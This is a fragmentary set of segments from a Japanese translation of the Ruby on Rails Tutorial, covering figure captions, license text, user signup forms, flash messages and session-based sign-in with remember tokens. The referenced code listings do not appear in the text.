{0}図5.3{/0}{1}Bootstrap CSSとサンプルアプリケーション。\href{http://railstutorial.org/images/figures/sample_app_only_bootstrap_4_0-full.png}{(拡大)}{/1}
{0}図5.4{/0}{1}スペースや共通スタイルを追加した結果。\href{http://railstutorial.org/images/figures/sample_app_universal_4_0-full.png}{(拡大)}{/1}
{0}図5.5{/0}{1}タイポグラフィースタイルを追加する。\href{http://railstutorial.org/images/figures/sample_app_typography_4_0-full.png}{(拡大)}{/1}
{0}図1.3{/0} {1}デフォルトのRailsページ。\href{http://railstutorial.org/images/figures/riding_rails_4_0-full.png}{(拡大)}{/1}
{0}図1.4{/0} {1}アプリケーション環境が表示されているデフォルトページ。\href{http://railstutorial.org/images/figures/riding_rails_environment_4_0-full.png}{(拡大)}{/1}
{0}図5.6{/0}{1}デザインされたロゴとサンプルアプリ。\href{http://railstutorial.org/images/figures/sample_app_logo_4_0-full.png}{(拡大)}{/1}
{0}図1.6{/0}{1}アカウント作成直後のGitHubページ。\href{http://railstutorial.org/images/figures/create_first_repository_4_0-full.png}{(拡大)}{/1}
{0}図5.7{/0}{1}Homeページ (\href{http://localhost:3000/static_pages/home}{/static_pages/home}) にフッターを追加する。\href{http://railstutorial.org/images/figures/site_with_footer_bootstrap_4_0-full.png}{(拡大)}{/1}
このチュートリアル構成は、Michael Erasmusによる素晴らしいブログ記事「\href{http://2beards.net/2011/11/the-rails-3-asset-pipeline-in-about-5-minutes/}{5分でわかるRails 3のAsset Pipeline} (英語)」をもとにしています。
{0}図1.7{/0}{1}GitHubのリポジトリページ。\href{http://railstutorial.org/images/figures/github_repository_page_4_0-full.png}{(拡大)}{/1}
{0}図1.8{/0}{1}GitHub上の、無用な初期の\kode{README}ファイル。\href{http://railstutorial.org/images/figures/rails_readme_4_0-full.png}{(拡大)}{/1}
{0}図1.9{/0} {1}Markdownを使用してフォーマットされた改良版\kode{README}ファイル。\href{http://railstutorial.org/images/figures/new_readme_4_0-full.png}{(拡大)}{/1}
Heroku上で動作しているRailsチュートリアルの最初のアプリケーション。\href{http://railstutorial.org/images/figures/heroku_app_4_0-full.png}{(フルサイズ)}
{0}図1.11{/0}{1}見事なHerokuのインターフェイス。\href{http://railstutorial.org/images/figures/heroku_info_4_0-full.png}{(拡大)}{/1}
{0}図5.8{/0}{1}\href{http://localhost:3000/about}{/about}で表示されるAboutページ。\href{http://railstutorial.org/images/figures/about_page_styled-full.png}{(拡大)}{/1}
{0}図5.9{/0}{1}\href{http://localhost:3000/signup}{/signup}で表示される新しいサインアップページ 。\href{http://railstutorial.org/images/figures/new_signup_page_bootstrap-full.png}{(拡大)}{/1}
前書き
私自身、章の終わりにある練習問題もやりながら、この \emph{Rails チュートリアル}を3日間かけて一気に読破しました。
謝辞
著者
\href{http://michaelhartl.com/}{マイケルハートル (Michael Hartl)} は、「\href{http://ruby.railstutorial.org/}{\emph{Ruby on Rails チュートリアル}}」という、\href{http://rubyonrails.org/}{Ruby on Rails} を使って初めて Web アプリケーションを開発する際に最もよく参考にされる本の著者です。
著作権とライセンス
Copyright (c) 2013 Michael Hartl
Permission is hereby granted, free of charge, to any person
obtaining a copy of this software and associated documentation
<n>files (the "Software"), to deal in the Software without restriction,
<n>including without limitation the rights to use, copy, modify, merge,
<n>publish, distribute, sublicense, and/or sell copies of the Software,
<n>and to permit persons to whom the Software is furnished to do so,
subject to the following conditions:<n><n>The above copyright notice and this permission notice shall be
<n>included in all copies or substantial portions of the Software.
 * "THE BEER-WARE LICENSE" (Revision 42):
 * Michael Hartl wrote this code.
\ref{sec:signup_success}でも説明しますが、ユーザーの作成で重要なのは\kode{input}ごとにある特殊な\kode{name}属性です。
Railsはこれらの\kode{name}の値を使用して、初期化ハッシュを (\kode{params}変数経由で) 構成します。このハッシュは、ユーザーが入力した値に基づいてユーザーを作成するとき (\ref{sec:signup_failure}) に使用されます。
前者の問題を\ref{sec:signup_error_messages}で、後者の問題を\ref{sec:signup_success}でそれぞれ解決していきます。
保存に失敗した場合は、単に\ref{sec:signup_failure}で開発したとおりの動作が実行{されます。
Userモデルができあがったので、いよいよWebサイトになくてはならないユーザー登録機能を追加しましょう。
これまでと同様、開発と同時にテストも作成します。RSpecとCapybaraの適用範囲を拡大し、簡潔かつ表現力豊かな結合テストを作成します。
登録していない場合は、上記を参照して登録しておいてください。
{0}図7.1{/0}{1}この節で作成するユーザープロファイルのモックアップ。\href{http://railstutorial.org/images/figures/profile_mockup_profile_name_bootstrap-full.png}{(拡大)}{/1}
{0}図7.2{/0}{1}理想とする最終的なプロファイルページのモックアップ。\href{http://railstutorial.org/images/figures/profile_mockup_bootstrap-full.png}{(拡大)}{/1}
{0}図7.3{/0}{1}サンプルアプリケーションのHomeページ (\href{http://localhost:3000/}{/}) にデバッグ情報を表示する。\href{http://railstutorial.org/images/figures/home_page_with_debug_4_0-full.png}{(拡大)}{/1}
特に、\kode{Rails.env.development?}が\kode{true}になるのは開発環境に限られるため、以下の埋め込みRuby
{0}図7.4{/0}{1}/users/1にアクセスした時のエラーページ。\href{http://railstutorial.org/images/figures/profile_routing_error-full.png}{(拡大)}{/1}
RESTスタイルのURLを有効にするには、routesファイル (\kode{config/routes.rb})に以下の1行を追加します。
これはリスト\ref{code:signup_route}で使用されていました。
リスト\ref{code:users_resource}のコードを使用することで、ルーティングが有効になります。ただし、ルーティング先のページはまだありません (図\ref{fig:user_show_unknown_action_4})。
{0}図7.5{/0}{1}URI /users/1のルーティングは有効だがページがない状態。\href{http://railstutorial.org/images/figures/user_show_unknown_action_4-full.png}{(拡大)}{/1}
このビューでは埋め込みRubyを使用してユーザー名とメールアドレスを表示しています。インスタンス変数\kode{@user}があることを前提としています。
もちろん、ユーザー表示ページの最終的な状態はこれとは大きく異なりますし、このメールアドレスがこのまま一般に公開されるようなこともありません。
図\ref{fig:user_show_rails_3}のデバッグ情報で\kode{params[:id]}の値を確認できることにも注目してください。
{0}図7.6{/0}{1}Usersリソース追加後の\href{http://localhost:3000/users/1}{/users/1}のユーザー表示ページ。 \href{http://railstutorial.org/images/figures/user_show_bootstrap-full.png}{(拡大)}{/1}
Factory Girlを使用したテストを実行してみるとすぐに気が付くと思いますが、正直言って\emph{遅い}です。
これはFactory Girlに問題があるわけではなく、あくまで\emph{機能}の一部であり、バグではありません。
残念ながら、このままではユーザーの作成をそのままテストに含めると遅くなってしまいます。幸いなことに、この問題は簡単に回避できます。
\texttt{bcrypt-ruby}ライブラリでは、セキュアハッシュを生成する際の計算の負荷を\emph{コストファクター (cost factor) }として指定できます。
コストファクターのデフォルト値は速度よりセキュアであることを重視しています。これは本番環境では最適ですが、テスト環境では不利です。私たちはテストを\emph{高速で}行いたいのであり、ユーザーのパスワードハッシュのセキュリティについてはテスト中は気にしたくありません。
selfを省略した結果をリスト\ref{code:test_bcrypt_cost_factor}に示します。
# bcrypt'のコスト関数を下げることでテストの速度を向上させる。
ビューを作成するときは、ページの構造が正確であるかどうかよりもページの外観の方を重要視するのが普通なので、少なくとも今はビューをテストする必要はありません。
もちろん、映画「\href{http://www.imdb.com/title/tt0499549/}{アバター}」を見た人にはこんな解説は不要でしょう。
Gravatarは\href{http://github.com/}{GitHub}の共同設立者であるTom Preston-Wernerによって開発され、後に\href{http://automattic.com/}{Automattic} (\href{http://wordpress.com/}{WordPress}の作者) に買い取られました。Gravatarは無料のサービスで、プロファイル写真をアップロードして、指定したメールアドレスと関連付けることができます。
この時点では、以下のテストスイートは失敗するはずです。
\kode{gravatar_for}メソッドが未定義のため、ユーザー表示ビューは現在動作していません。
(このようなエラーを捉えることができるのが、ビューでSpecsを使用する大きなメリットです。
だからこそ、どんなに小規模であってもよいのでビューで\emph{何らかの}テストを行っておくことが重要なのです。)
\href{http://en.gravatar.com/site/implement/hash/}{Gravatarのホームページ}にも書かれているように、GravatarのURLは\href{http://en.wikipedia.org/wiki/MD5}{MD5ハッシュ}を用いてユーザーのメールアドレスをハッシュ化しています。
# Returns the Gravatar (http://gravatar.com/) for the given user.
今度は以下のテストスイートは成功するはずです。
{0}図7.7{/0}{1}ユーザープロファイルページ\href{http://localhost:3000/users/1}{/users/1}にデフォルトのGravatarが表示されている。\href{http://railstutorial.org/images/figures/profile_with_gravatar_bootstrap_4_0-full.png}{(拡大)}{/1}
{0}図7.8{/0}{1}ユーザー表示ページにカスタムのGravatarを表示する。\href{http://railstutorial.org/images/figures/profile_custom_gravatar_bootstrap_4_0-full.png}{(拡大)}{/1}
\kode{row}クラスと\kode{span4}クラスも追加しておきます。これらのクラスはBootstrapの一部です。
{0}図7.9{/0}{1}ユーザー表示ページ\href{http://localhost:3000/users/1}{/users/1}にサイドバーとCSSを追加する。\href{http://railstutorial.org/images/figures/user_show_sidebar_css_bootstrap-full.png}{(拡大)}{/1}
{0}図7.10{/0}{1}現状のユーザー登録ページ  \href{http://localhost:3000/signup}{/signup}。\href{http://railstutorial.org/images/figures/new_signup_page_bootstrap-full.png}{(拡大)}{/1}
{0}図7.11{/0}{1}ユーザー登録ページのモックアップ。\href{http://railstutorial.org/images/figures/signup_mockup_bootstrap-full.png}{(拡大)}{/1}
Web経由でユーザーを作成する機能をこれから追加しますので、\ref{sec:creating_a_user}で作成したユーザーをここで削除しておきましょう。
完全なテスト機能を備えた強力なWebフレームワークがなかった頃は、テスティング作業は苦痛に満ち、しばしばそこでエラーが発生しました。
RSpecとCapybaraを使用することで、柔軟性の高いテストを作成できるようになり、従来手動で行うしかなかったこれらのテストを自動化できるようになりました。
私たちは、既にCapybaraがWeb操作の文法を直感的にサポートしているところを目の当たりにしてきました。
目標は、正しくないユーザー登録情報と正しいユーザー登録情報を与えたときに、期待どおりに動作することを確認するテストの作成です。
このテストはかなり込み入っているので、1つ1つ作り上げていきましょう。
最初のタスクは、ユーザー登録フォームの表示が失敗しないかどうか、そしてページを表示し、ボタンを押し、無効なデータを送信する動作をシミュレートすることです。ボタンを代わりに押すには\kode{click_button}を使用します。
このテストは、ユーザー登録ページをブラウザで表示し、ユーザー登録情報に何も入力しないまま送信する操作 (無効な操作) と同等です。
同様に、有効なデータを送信する操作をシミュレートするには、 \kode{fill_in}を使用して正しいユーザー情報を与えます。
このテストの目的は、ユーザー登録ボタンを押したときに期待どおりに動作すること、ユーザー情報が有効な場合にはユーザーが新規作成され、無効な場合にはユーザーが作成されないことを確認することです。
この節の冒頭でデータベースをリセットしてあるので、現時点では\kode{User.count}は\kode{0}になっています。
無効なデータを送信した場合、ユーザーのカウントが変わらないことが期待されます。有効なデータを送信した場合には、ユーザーのカウントが1つ増えることが期待されます。
このような動作は、RSpecで\kode{expect}メソッドを\kode{to}メソッドまたは \kode{not_to}メソッドと組み合わせて実現できます。
まずは、確認しやすい無効な場合についてやってみましょう。ユーザー登録ページのパスをブラウザで開いてボタンをクリックしたら、ユーザーアカウントが変更\emph{されない}という動作です。
これは\kode{change}メソッドで役に立ちます。このメソッドはオブジェクトとシンボルを引数に取り、シンボルを呼び出した結果を計算してオブジェクト上のメソッドとします。これはブロックの前と後いずれについても行われます。
以下を計算します。
上の計算は、以下の実行前と実行後の両方で行われます。
この場合は、コードがカウントを変更\emph{しない}ことが期待されますので、\kode{not_to}メソッドで表現しています。
実際には、以下の同等のコードを
ボタンクリックをブロックで囲むことによって以下のように1行で表しています。
こうすることで英語に近い自然な表記が可能になり、さらにコンパクトになります
(\kode{eq}は同値性をテストするRSpecのメソッドです)。
データが有効な場合のテストも大きな違いはありませんが、今度はカウントが更新されないのではなく、カウントが1つ増えることを確認します。
ここでは\kode{to}メソッドを使用して、正しいデータを与えてユーザー登録ボタンを押したときにカウントが1つ\emph{増える}ことを確認します。
selfを省略した結果をリスト\ref{code:basic_signup_tests}に示します。
ここでは、送信ボタン用の共通部分を分解するために\kode{let}メソッドを使用して\kode{submit}変数を定義しています。
ユーザー登録の基本的なテスト。
テストにパスするには、ユーザー登録ページを正しいHTML要素で作成し、ページの送信が正しい場所へルーティングされるようにし、ユーザーデータが正しい場合にのみ新しいユーザーを作成できるようにする必要があります。
もちろん、今の時点ではテストは失敗します。
テストが正しく失敗したので、今度はユーザー登録の\emph{フォーム}を作成してテストにパスするようにしましょう。
作成したコードをリスト\ref{code:signup_form}に示します
(Rails 2.xに慣れている方は、\kode{form_for}ではコンテンツを挿入するときに “%=” を使用するERb方式の文法を使用していることに注意してください。
このフォームの各部分について見てみましょう。
\kode{do}キーワードは、 \kode{form_for}が1つの変数を持つブロックを取ることを表します。この変数\kode{f}は “form” のfです。
通常、Railsヘルパーを使用している場合、実装の詳細について知っておく必要はありません。ただし\emph{f}というオブジェクトが\kode{何をするのか}は知っておく必要があります。 \href{http://www.w3schools.com/html/html_forms.asp}{HTMLフォーム要素} (テキストフィールド、ラジオボタン、パスワードフィールドなど) に対応するメソッドが呼び出されると、\emph{@user} オブジェクトの属性を設定するように特別に設計された要素のためのコードを返します。
(この\kode{-e}オプションは、descriptionの文字列が\kode{"signup page"}に一致する例を単に実行するためのものです。
これはリスト\ref{code:basic_signup_tests}で使用されていました。
テストにパスしてフォームが正常に出力されるようにするには、\kode{new.html.erb}に対応する\kode{@user}変数をコントローラのアクションで定義する必要があります。たとえば、Usersコントローラの\kode{new}がそうです。
置き換えた結果を{0}{1}リスト4.3{/1}{/0}に示します。
\kode{@user}変数が上記のように定義されれば、以下のユーザー登録ページのテストはパスするはずです (訳注: 以下のコマンドでは "signup page" のテストだけを行なっています)。
{0}図7.12{/0}{1}新規ユーザーのためのユーザー登録フォーム\href{http://localhost:3000/signup}{/signup}。\href{http://railstutorial.org/images/figures/signup_form_bootstrap-full.png}{(拡大)}{/1}
このHTMLの細かい部分はほとんど私たちの目的には関係ありませんが、この構造の最も重要な部分に注目してみましょう。
(実は、このソースからは\emph{信頼性トークン (authenticity token) }関連のHTMLを除外してあります。Railsは、ある種の\emph{クロスサイトリクエスト偽造} (CSRF: cross-site request forgery) 攻撃に対抗するためにこのようなHTMLを自動的に追加します。
動作の詳細や、この防御が重要な理由を知りたい場合は、Stack Overflowの\href{http://stackoverflow.com/questions/941594/understand-rails-authenticity-token}{Rails信頼性トークン関連の書き込み} (英語) を参照してください。
{0}図7.13{/0}{1}\kode{text}フィールドと\kode{password}フィールドに文字を入力した状態。\href{http://railstutorial.org/images/figures/filled_in_form_bootstrap-full.png}{(拡大)}{/1}
{0}図7.14{/0}{1}ユーザー登録が失敗したときのモックアップ。\href{http://railstutorial.org/images/figures/signup_failure_mockup_bootstrap-full.png}{(拡大)}{/1}
リスト\ref{code:basic_signup_tests}のとき
コメントにもあるように、上のコードはまだ実装が完了していませんので注意してください。しかし実装の出発点としてはこれで十分です。
ユーザー登録失敗。\href{http://railstutorial.org/images/figures/signup_failure_rails_4-full.png}{(フルサイズ)}
ユーザー登録失敗時のデバッグ情報。\href{http://railstutorial.org/images/figures/signup_failure_rails_4_debug-full.png}{(フルサイズ)}
関連する以下のテストが失敗することを確認することで、このことをダブルチェックできます。
-e "signup with invalid information"
以前のバージョンのRailsでは、\kode{モデル}層で\emph{attr_accessible}メソッドを使用することで上のような危険を防止していましたが、 Rails 4.0ではコントローラ層で\kode{Strong Parameters}というテクニックを使用することが推奨されています。
ユーザー登録に失敗した場合の最後の手順として、問題が生じたためにユーザー登録が行われなかったということをユーザーにわかりやすく伝えるエラーメッセージを追加しましょう。
selfを省略した結果をリスト\ref{code:f_error_messages}に示します。
これはリスト\ref{code:errors_partial}で使用されていました。
{0}図7.17{/0}{1}ユーザー登録失敗時のエラーメッセージ。\href{http://railstutorial.org/images/figures/signup_error_messages_bootstrap-full.png}{(拡大)}{/1}
テストの結果を図\ref{fig:blank_signup_password_digest}に示します。
今度は期待どおりテストにパスするはずです。
{0}図7.18{/0}{1}\href{http://localhost:3000/signup}{/signup}を表示して何も入力せずに [Create my account] をクリックする。\href{http://railstutorial.org/images/figures/blank_signup_password_digest_bootstrap_4_0-full.png}{(拡大)}{/1}
{0}図7.19{/0}{1}ユーザー登録に成功した画面のモックアップ。\href{http://railstutorial.org/images/figures/signup_success_mockup_bootstrap-full.png}{(拡大)}{/1}
現時点では、以下の有効な送信テストは失敗するはずです。
Railsのデフォルトのアクションは対応するビューを表示するようになっていますが、\kode{create}アクションに対応するビューのテンプレートがない (あるはずがありません) ため、テストに失敗します。
ここでは、登録後に別のページを表示するようにし、そのページが新規作成されたユーザープロファイルであることがわかるようにします。
リダイレクトでは\kode{user_url}を省略し、単に\kode{redirect_to @user}と書けばユーザー表示ページに移動します。
いよいよブラウザで正しいユーザー情報を登録できるようになりましたが、その前にWebアプリケーションに常識的に備わっている機能を追加してみましょう。登録完了後に表示されるページにメッセージを表示し (この場合は新規ユーザーへのウェルカムメッセージ)、2度目以降にはそのページにメッセージを表示しないようにするというものです。
Railsでは、こういう場合に\emph{flash}という特殊な変数を使用できます。この変数はハッシュのように扱うことができます。
たとえば、\kode{flash[:success] = "Welcome to the Sample App!"}とする場合、以下のコードを実行すると
以下のHTMLが生成されます。
(ハッシュの\kode{:success}キーはシンボルである点に注目してください。Rubyはシンボルを自動的に \kode{"success"} という文字列に変換してからテンプレートに挿入します。)
使用するすべてのキーと値を列挙する理由は、他のフラッシュメッセージも使えるようにするためです。
selfを省略した結果をリスト\ref{code:signup_flash}に示します。
ついに、ユーザー登録が完成しました。名前: “Rails Tutorial”、メールアドレス: “\texttt{example@railstutorial.org}”とでも登録してみましょう。
{0}図7.20{/0}{1}ユーザー登録が成功し、フラッシュメッセージが表示される。\href{http://railstutorial.org/images/figures/signup_flash_bootstrap-full.png}{(拡大)}{/1}
{0}図7.21{/0}{1}ブラウザでページを再読み込みしてフラッシュメッセージが表示されなくなる。\href{http://railstutorial.org/images/figures/signup_flash_reloaded_bootstrap-full.png}{(拡大)}{/1}
今度はデータベースを覗いて、新規ユーザーが確かに登録されていることをダブルチェックしましょう。
created_at: "2013-03-12 05:51:34", updated_at: "2013-03-12 05:51:34",
password_digest: "$2a$10$A58/j7wwh3aAffGkMAO9Q.jjh3jshd.6akh..."
{0}図7.22{/0}{1}本番Webで動作中のユーザー登録ページ。 \href{http://railstutorial.org/images/figures/signup_in_production_bootstrap-full.png}{(拡大)}{/1}
これはリスト\ref{code:f_error_messages}で使用されていました。
これはリスト\ref{code:error_messages_test}で使用されていました。
お勧めのエラーメッセージテスト。
\kode{create}アクションで保存が行われた後の動作をテストする。
これにより、サインインの状態と現在のユーザーidに応じて動作を変更できるようになります。
たとえば、この章では、サイトのヘッダー部分にサインイン／サインアウトのリンクとプロファイルへのリンクを表示するようにします。
ユーザーがサインインすることでセキュリティモデルも実装され、サインインしているユーザーidに基づいて、特定のページへのアクセスを制限することもできます。
特に、2つの開発手法を比較するために、RSpecによる結合テストの組み合わせをCucumberで再実装します。
\href{http://en.wikipedia.org/wiki/Session_(computer_science)}{\emph{セッション}}とは、2つのコンピュータの間、たとえばクライアント側のブラウザとサーバーで動作しているRailsとの間の、半永続的な接続のことです。
ここでは、”サインイン” の共通パターンを実装するためにセッションを使用します。ここで、Webの世界にはセッションの振る舞いを表現するためのいくつかの異なったモデルがあります。ブラウザを閉じるとセッションを終了する「忘却モデル」、[パスワードを保存する] チェックボックスを使用してセッションを継続する「継続モデル」、ユーザーが明示的にサインアウトするまでセッションを継続する「永続モデル」などです
ここでは、最後の永続モデルを採用することにします。ユーザーがサインインすると、ユーザーが明示的にサインアウトするまでサインインの状態を永続させます
セッションは、RESTfulなリソースとして作成しておくと便利です。たとえばサインインページを\emph{new}セッションで、サインインを\emph{create}セッションで、サインアウトを\emph{destroy}セッションでそれぞれ扱います。
Usersリソースのように (Usersモデルを経由して) データベースをバックエンドに持つリソースとは異なり、このSessionsリソースでは\href{http://en.wikipedia.org/wiki/HTTP_cookie}{\emph{cookies}}を使用します。cookiesとは、ブラウザに保存される小さなテキストデータです。
サインイン関連の作業の大半は、このcookiesをベースにして認証システムを構築することになります。
この節と次の節では、セッション機能を作成する準備として、Sessionコントローラ、サインイン用のフォーム、そしてこれらに関連するコントローラのアクションを作成します。
それでは最初に、Sessionsコントローラと認証システムをテストする結合テストを作成します。
{0}図8.1{/0}{1}サインインフォームのモックアップ。\href{http://railstutorial.org/images/figures/signin_mockup_bootstrap-full.png}{(拡大)}{/1}
selfを省略した結果をリスト\ref{code:new_session_tests}に示します。
セッションの\kode{new}アクションとビューをテストする。
以下のテストは、この時点では失敗するはずです。
Usersリソースの場合と同様に、\kode{resources}メソッドを使用して通常のRESTfulなルーティングを設定することができます。
セッションを編集したりユーザーに表示したりする必要がないので、\kode{resources}メソッドに\kode{:only}オプションを追加し、\kode{new}、\kode{create}、\kode{destroy}の3つのアクションのみを有効にします。
注: サインアウトのルーティングにある\kode{via: ’delete’}は、このアクションが HTTPの\texttt{DELETE}リクエストによって呼び出されることを示しています。
注：サインインとサインアウトのアクションのルーティングはカスタムで設定しますが、セッションの生成アクションへのルーティングはデフォルトを使います (i.e., \kode{[resource name]_path}).
新しいセッション用 (サインイン)
/signout
セッションを削除する (サインアウト)
最初のSessionsコントローラ。
最後に、サインインページを新規に定義します。
このページは新規セッション用なので、今から作成するサインインページを\kode{app/views/sessions/new.html.erb}に置くことに注目ください。
これはリスト\ref{code:initial_signin_page}で使用されていました。
最初のサインインビュー。
ユーザー登録フォームのときと同様に、サインインフォームでもCapybaraを使ってフォームに値を入力し、ボタンをクリックするテストを行うことができます。
テストを作成していると、私たちはアプリケーションをさまざまな側面から設計することを強いられます。これはテスト駆動開発の素晴らしい副次的効果のひとつです。
{0}図8.2{/0}{1}サインイン失敗時のモックアップ。\href{http://railstutorial.org/images/figures/signin_failure_mockup_bootstrap-full.png}{(拡大)}{/1}
ここではエラーをフラッシュメッセージとして表示するので、以下のようにテストできます。
\kode{have_selector}メソッドは、特定のセレクタ要素 (HTMLタグなど) があるかどうかをチェックします。なお、Capybara 2.0では\emph{画面に表示される要素}しかチェックできません。
セレクタ要素（つまりタグ）は以下のように指定します。
上のコードは\kode{div}タグがあるかどうかをチェックします。
これはリスト\ref{code:initial_failing_signin_test}で使用されていました。
サインイン失敗時のテスト。
サインインに失敗した時のテストができたので、次はサインインに成功した場合のテストを作成しましょう。
ユーザープロファイルページが表示されること (ページタイトルがユーザー名になっていること)、サイトのナビゲーションに次の3つの変更が加えられていることを確認するよう、テストを変更します。
プロファイルページヘのリンクの表示
[Sign out] リンクの表示
[Sign in] リンクの非表示
サインインに成功後表示されるユーザー・プロファイルのモックアップ。 \href{http://railstutorial.org/images/figures/signin_success_mockup_bootstrap-full.png}{(拡大表示)}
これはリスト\ref{code:signin_success_tests}で使用されていました。
サインインに成功したときのテスト。
上のコードでは、Capybaraの\kode{have_link}メソッドが導入されています。
このメソッドは、リンクテキストを引数にとります。オプションとして次のように\kode{:href}パラメータを加えると、
アンカータグ\kode{a}に\kode{href} (URL) 属性を追加することもできます (この例では、ユーザープロファイルへのリンク)。
上のテストでは、\kode{upcase}メソッドを使用してユーザーのメールアドレスを大文字に変換することで、大文字小文字を区別しないデータベースが使用されている場合であってもユーザーを確実に検索できるように配慮してあることに注目してください。
テストの準備が完了したので、いよいよサインインフォームの開発に取りかかりましょう。
このユーザー登録フォームとサインインフォームの主な違いは、サインインフォームにはSessionモデルがないために\kode{@user}変数のような存在がないことです。
selfを省略した結果をリスト\ref{code:signin_form}に示します。
サインインフォームのコード。
{0}図8.4{/0}{1}サインインフォーム  (\href{http://localhost:3000/signin}{/signin})。\href{http://railstutorial.org/images/figures/signin_form_bootstrap-full.png}{(拡大)}{/1}
ユーザーを作成する (ユーザー登録) 場合と同様、セッションを作成する場合 (サインイン) で最初にやることは、\emph{正しくない}入力の取り扱いです。
これはリスト\ref{code:initial_create_session}で使用されていました。
認証に失敗したとき、\kode{authenticate}の返り値は\kode{false}になることを思い出してください。ユーザーのサインイン方法の方針をまとめると以下のようになります。
# ユーザーをサインインさせ、ユーザーページ (show) にリダイレクトする。
# エラーメッセージを表示し、サインインフォームを再描画する。
代わりに、サインインに失敗したときにフラッシュメッセージを表示することにします。
最初のコードをリスト\ref{code:failed_signin_attempt}に示します (このコードはわざと少し間違えてあります)。
サインインの失敗を扱う (誤りあり)。
{0}図8.6{/0}{1}サインインに失敗したときのフラッシュメッセージ。\href{http://railstutorial.org/images/figures/failed_signin_flash_bootstrap-full.png}{(拡大)}{/1}
本文およびリスト\ref{code:failed_signin_attempt}のコメントで述べたように、このコードには誤りがあります。
{0}図8.7{/0}{1}フラッシュメッセージが消えずに残っている例。\href{http://railstutorial.org/images/figures/flash_persistence_bootstrap-full.png}{(拡大)}{/1}
フラッシュメッセージの残留問題はこのアプリケーションのバグです。この問題を修正する前に、この問題をキャッチするテストを書くのが正しいやり方です。
特に、現在のサインイン失敗テストではこの問題がキャッチされずにパスしてしまいます。
当然ながら、既知のバグが未修正の状態であれば、このテストはパスするべきではありません。この問題をキャッチする、失敗するテストを追加しましょう。
幸い、結合テストはフラッシュメッセージ残留などの多くの問題解決において大活躍します。期待される動作は以下のテストで正確に表現されています。
このテストは、無効なサインインデータを送信し、次にWebサイトのレイアウトにあるHomeリンクを開き、フラッシュメッセージが表示されていないことを確認します。
これはリスト\ref{code:correct_signin_failure_test}で使用されていました。
サインインの失敗を正しくテストするコード。
再度テストを実行すると、期待どおり失敗します。
失敗するテストがパスするようになるために、\kode{flash}の代わりに\kode{flash.now}を使用します。これもページでフラッシュメッセージを表示するために特に設計されたメソッドですが、\kode{flash}の場合とは異なり、他のリクエストが発生したらすぐにメッセージを消します。
これはリスト\ref{code:correct_signin_failure}で使用されていました。
サインインが失敗したときの正しいコード。
これで、ユーザー情報が無効な場合のテストスイートが緑色 (成功) になりました。
 サインイン失敗をテストできるようにしたので、次は実際にユーザーをサインインさせましょう。
この節で必要なRubyのプログラミングは、本書の中ではこれまでで最も難易度が高くなっています。どうか最後まであきらめずにがんばってください。ここからの力仕事に備えておきましょう。
幸い、はじめの一歩は簡単です。Sessionsコントローラの\kode{create}アクションはすぐできあがります。
残念ながら、少々ズルもしています。
なぜこれがズルなのかというと、何と\kode{sign_in}はこの時点では存在していないのです。
この節の残りは、この関数を完成させることに費やされます。
Sessionsコントローラの\kode{create}アクションが完成したところ (まだ動きません)。
これよりサインインモデルの実装を開始します。具体的には、サインイン状態を「永続化」し、ユーザーが明示的にサインアウトしたときにのみセッションを終了します。
サインイン関数そのものは伝統的なMVC (model-view-controller)) に帰着します。特に、いくつかのサインイン関数についてはコントローラとビューのどちらからも使用できるようにする必要があります。
認証のためにまったく新しいモジュールを作ることも可能ですが、Sessionsコントローラには既に\kode{SessionsHelper}というモジュールが備わっています。
デフォルトでは、すべてのヘルパーはビューで使用できますが、コントローラでは使用可能になっていません。
Sessionsヘルパーはビューとコントローラの両方でメソッドが必要となるので、コントローラでは上のように明示的にインクルードする必要があります。
HTTPは\href{http://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#HTTP_session_state}{\emph{ステートレスなプロトコル}}であり、そのままでは状態が保存されないので、Webアプリケーションのサインインは、ページからページの移動を追跡するという方法で実装する必要があります。
ユーザーのサインイン状態を保持するひとつの方法は、伝統的なRailsセッション (特殊な\kode{session}関数を使用) を使って、ユーザーIDに等しい「\emph{記憶トークン (remember token)}」を保持することです。
この\kode{session}オブジェクトは、ユーザーidをcookiesに保持することで、ページ移動後にもユーザーidを参照できるようにしています。cookiesはブラウザが閉じられると無効になります。
アプリケーションは、ページごとに以下の呼び出しを行います。
これだけで、ユーザーを取り出すことができます。
Railsでは、セッションがセキュアになるように扱っていますので、悪意のあるユーザーがidをなりすまそうとしても、Railsはセッションごとに生成される特別の\emph{セッションid}によって不一致を検出します。
私たちのアプリケーション設計では、\emph{永続的な}セッションを採用します。つまり、ブラウザを閉じた後にもサインイン状態を保持するということであり、サインインしたユーザーに対して何らかの\emph{恒久的な}識別子を使用する必要があります。
これを実現するために、ユーザーごとに一意かつ安全な記憶トークンを生成し、ブラウザを閉じても無効にならない\emph{恒久的な}cookiesとして登録します。
{0}図8.8{/0}{1}\kode{remember_token}属性を追加したUserモデル。{/1}
記憶トークン用の最初のテスト。
コマンドラインで以下のように記憶トークンを生成することで、上のテストがパスするようになります。
\kode{remember_token}を\kode{users}テーブルに追加したマイグレーション。
次に、いつものように開発データベースとテストデータベースを更新します。
この時点で、Userモデルのspecはパスするはずです。
有力な候補としてさまざまなものが考えられますが、基本的には一意性を確保できる、長くてランダムな文字列でさえあればどんなものでも良いでしょう。
記憶トークンをさらにセキュアにするためには、新しいセッションを作成するたびにトークンを更新するのがよい方法です。この方法なら、攻撃者が盗んだcookiesを使用して本物のユーザーになりすましてサインインしようとする (\href{http://en.wikipedia.org/wiki/Session_hijacking}{セッションハイジャック}) ことがあっても、ユーザーが次回サインインするときにはトークンが期限切れになります。
(セッションハイジャックは、セキュリティ上の注意を呼びかけるためにこれを実演する\href{http://codebutler.com/firesheep}{Firesheep}アプリケーションによって広く知られるようになりました。Firesheepを使用すると、公共Wi-Fiネットワーク経由で接続したときに多くの有名Webサイトの記憶トークンが丸見えになっていることがわかります。
サンプルアプリケーションでは、新規作成されたユーザーをその場でサインインさせ、その副作用として記憶トークンがついでに作成されますが、この動作に依存すべきではありません。安全を確保するために、\emph{すべての}ユーザーが必ず最初から有効な記憶トークンを持つようにする必要があります。
ユーザーの削除はどのユーザーにも許可できるものではないので、管理ユーザー (admin) の特権クラスを作成し、このユーザーにのみ削除を許可するようにします。
あのときは\kode{before_save}というコールバックを使用しましたが、ここではそれによく似た\kode{before_create}というコールバックを使用して、ユーザー新規作成時に記憶トークンを設定することにします
Active Recordでサポートされるコールバックの種類の詳細については、Rails Guidesの「\href{http://guides.rubyonrails.org/v3.2.13/active_record_validations_callbacks.html}{コールバックについて} (英語)」を参照してください。
